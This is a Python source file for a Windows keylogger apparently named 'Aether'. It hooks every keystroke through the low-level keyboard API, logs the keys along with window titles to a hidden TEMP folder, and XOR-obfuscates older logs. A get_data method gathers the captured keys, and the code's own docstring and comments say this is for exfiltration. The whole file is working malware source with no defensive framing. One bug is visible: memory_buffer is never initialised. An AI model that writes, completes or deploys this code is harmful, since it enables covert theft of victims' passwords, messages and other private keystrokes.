import ctypes, ctypes.wintypes, threading, queue, time, json, os
from datetime import datetime

# Windows API constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_KEYUP = 0x0101
WM_SYSKEYUP = 0x0105

# Structures
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.wintypes.DWORD),
        ("scanCode", ctypes.wintypes.DWORD),
        ("flags", ctypes.wintypes.DWORD),
        ("time", ctypes.wintypes.DWORD),
        ("dwExtraInfo", ctypes.wintypes.ULONG)
    ]

class Keylogger:
    def __init__(self):
        self.hook = None
        self.running = False
        self.key_queue = queue.Queue()
        self.log_file = None
        self.current_window = ""
        self.log_dir = os.path.join(os.environ['TEMP'], 'AetherLogs')
        os.makedirs(self.log_dir, exist_ok=True)
        
        # Key mapping
        self.special_keys = {
            8: "[BACKSPACE]",
            9: "[TAB]",
            13: "[ENTER]",
            20: "[CAPSLOCK]",
            27: "[ESC]",
            32: "[SPACE]",
            33: "[PAGEUP]",
            34: "[PAGEDOWN]",
            35: "[END]",
            36: "[HOME]",
            37: "[LEFT]",
            38: "[UP]",
            39: "[RIGHT]",
            40: "[DOWN]",
            45: "[INSERT]",
            46: "[DELETE]",
            91: "[LWIN]",
            92: "[RWIN]",
            93: "[MENU]",
            112: "[F1]", 113: "[F2]", 114: "[F3]", 115: "[F4]",
            116: "[F5]", 117: "[F6]", 118: "[F7]", 119: "[F8]",
            120: "[F9]", 121: "[F10]", 122: "[F11]", 123: "[F12]",
            144: "[NUMLOCK]",
            160: "[LSHIFT]", 161: "[RSHIFT]",
            162: "[LCTRL]", 163: "[RCTRL]",
            164: "[LALT]", 165: "[RALT]",
            186: "[;]", 187: "[=]", 188: "[,]", 189: "[-]", 190: "[.]", 191: "[/]",
            192: "[`]", 219: "[[]", 220: "[\\]", 221: "[]]", 222: "[']"
        }
        
        # Hook procedure
        self.hook_proc = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(KBDLLHOOKSTRUCT))
        self.low_level_keyboard_proc = self.hook_proc(self.keyboard_callback)
    
    def get_foreground_window(self):
        """Get current foreground window title."""
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value
        except:
            return "Unknown"
    
    def get_key_name(self, vk_code, scan_code, flags):
        """Convert virtual key code to key name."""
        # Check for special keys first
        if vk_code in self.special_keys:
            return self.special_keys[vk_code]
        
        # Get key name from Windows
        buf = ctypes.create_unicode_buffer(256)
        ctypes.windll.user32.GetKeyNameTextW(scan_code << 16, buf, 256)
        key_name = buf.value
        
        # Handle shift states
        caps_lock = (ctypes.windll.user32.GetKeyState(0x14) & 0x0001) != 0
        shift_pressed = (ctypes.windll.user32.GetKeyState(0x10) & 0x8000) != 0
        
        # Convert to character if possible
        char_buffer = ctypes.create_unicode_buffer(10)
        keyboard_state = (ctypes.c_byte * 256)()
        ctypes.windll.user32.GetKeyboardState(keyboard_state)
        
        # Set shift state
        if shift_pressed:
            keyboard_state[0x10] = 0x80
        if caps_lock:
            keyboard_state[0x14] = 0x01
        
        result = ctypes.windll.user32.ToUnicode(vk_code, scan_code, keyboard_state, char_buffer, 10, 0)
        
        if result > 0:
            return char_buffer.value[:result]
        else:
            return key_name or f"[VK:{vk_code}]"
    
    def keyboard_callback(self, nCode, wParam, lParam):
        """Low-level keyboard hook procedure."""
        if nCode >= 0 and wParam in [WM_KEYDOWN, WM_SYSKEYDOWN]:
            kb_struct = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            
            # Get window title
            window_title = self.get_foreground_window()
            if window_title != self.current_window:
                self.current_window = window_title
                self.key_queue.put({
                    'type': 'window_change',
                    'window': window_title,
                    'timestamp': datetime.now().isoformat()
                })
            
            # Get key name
            key_name = self.get_key_name(kb_struct.vkCode, kb_struct.scanCode, kb_struct.flags)
            
            # Add to queue
            self.key_queue.put({
                'type': 'keypress',
                'key': key_name,
                'vk_code': kb_struct.vkCode,
                'window': self.current_window,
                'timestamp': datetime.now().isoformat()
            })
        
        # Pass to next hook
        return ctypes.windll.user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
    
    def start(self):
        """Start the keylogger."""
        if self.running:
            return "Keylogger already running"
        
        # Set hook
        self.hook = ctypes.windll.user32.SetWindowsHookExW(
            WH_KEYBOARD_LL,
            self.low_level_keyboard_proc,
            ctypes.windll.kernel32.GetModuleHandleW(None),
            0
        )
        
        if not self.hook:
            return "Failed to set keyboard hook"
        
        self.running = True
        
        # Start processing thread
        self.processing_thread = threading.Thread(target=self.process_queue, daemon=True)
        self.processing_thread.start()
        
        # Start log rotation thread
        self.rotation_thread = threading.Thread(target=self.rotate_logs, daemon=True)
        self.rotation_thread.start()
        
        return "Keylogger started"
    
    def stop(self):
        """Stop the keylogger."""
        if self.hook:
            ctypes.windll.user32.UnhookWindowsHookEx(self.hook)
            self.hook = None
        
        self.running = False
        
        if self.log_file:
            self.log_file.close()
            self.log_file = None
        
        return "Keylogger stopped"
    
    def process_queue(self):
        """Process keys from queue and write to log."""
        current_log = None
        
        while self.running:
            try:
                # Get key event (with timeout)
                event = self.key_queue.get(timeout=1)
                
                # Create new log file if needed
                if not current_log or self.should_rotate_log(current_log):
                    if current_log:
                        current_log.close()
                    
                    log_filename = f"keys_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                    log_path = os.path.join(self.log_dir, log_filename)
                    current_log = open(log_path, 'a', encoding='utf-8')
                    self.log_file = current_log
                
                # Write to log
                json.dump(event, current_log)
                current_log.write('\n')
                current_log.flush()
                
                # Also write to memory buffer for immediate exfiltration
                self.memory_buffer.append(event)
                if len(self.memory_buffer) > 1000:
                    self.memory_buffer = self.memory_buffer[-1000:]
                
            except queue.Empty:
                continue
            except Exception as e:
                pass
    
    def should_rotate_log(self, log_file):
        """Check if log should be rotated."""
        try:
            return log_file.tell() > 10 * 1024 * 1024  # 10MB
        except:
            return False
    
    def rotate_logs(self):
        """Rotate and encrypt old logs."""
        while self.running:
            time.sleep(300)  # Every 5 minutes
            
            try:
                # Encrypt logs older than 1 hour
                for filename in os.listdir(self.log_dir):
                    if filename.startswith('keys_') and filename.endswith('.json'):
                        filepath = os.path.join(self.log_dir, filename)
                        
                        # Check file age
                        stat = os.stat(filepath)
                        if time.time() - stat.st_mtime > 3600:
                            # Encrypt the file
                            with open(filepath, 'rb') as f:
                                data = f.read()
                            
                            # Simple XOR encryption
                            encrypted = bytes([b ^ 0xAA for b in data])
                            
                            enc_path = filepath.replace('.json', '.enc')
                            with open(enc_path, 'wb') as f:
                                f.write(encrypted)
                            
                            os.remove(filepath)
            except:
                pass
    
    def get_data(self, limit=1000):
        """Get keylogger data for exfiltration."""
        data = {
            'recent_keys': self.memory_buffer[-limit:] if self.memory_buffer else [],
            'log_files': []
        }
        
        # List encrypted log files
        try:
            for filename in os.listdir(self.log_dir):
                if filename.endswith('.enc'):
                    filepath = os.path.join(self.log_dir, filename)
                    stat = os.stat(filepath)
                    
                    data['log_files'].append({
                        'filename': filename,
                        'size': stat.st_size,
                        'modified': stat.st_mtime
                    })
        except:
            pass
        
        return data